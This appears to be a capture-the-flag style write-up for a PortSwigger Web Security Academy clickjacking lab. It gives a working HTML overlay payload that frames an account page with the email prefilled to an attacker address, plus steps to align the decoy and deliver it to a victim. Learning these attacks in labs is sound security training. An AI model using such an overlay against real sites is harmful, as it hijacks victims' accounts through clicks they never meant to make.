# Lab 04 — Clickjacking with form input data prefilled from a URL parameter

> **Practitioner** · [Official lab](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

**Entry point:** the email form is prefilled from `?email=` — pair that with
an overlay and the victim's single click changes their email.

## Solution

```html
<style>
  iframe { position: relative; width: 700px; height: 500px;
           opacity: 0.0001; z-index: 2; }
  div    { position: absolute; top: 400px; left: 60px; z-index: 1; }
</style>
<div>Click the prize!</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-you.net"></iframe>
```

1. Align the decoy `div` over the form's **Update email** button (start with
   `opacity: 0.1` while tuning, then set `0.0001`).
2. Deliver to victim — one click submits the prefilled form — lab solved.

## Notes

Prefilled inputs remove the need for multi-click tricks: the victim only
supplies the click, the URL supplies the data.
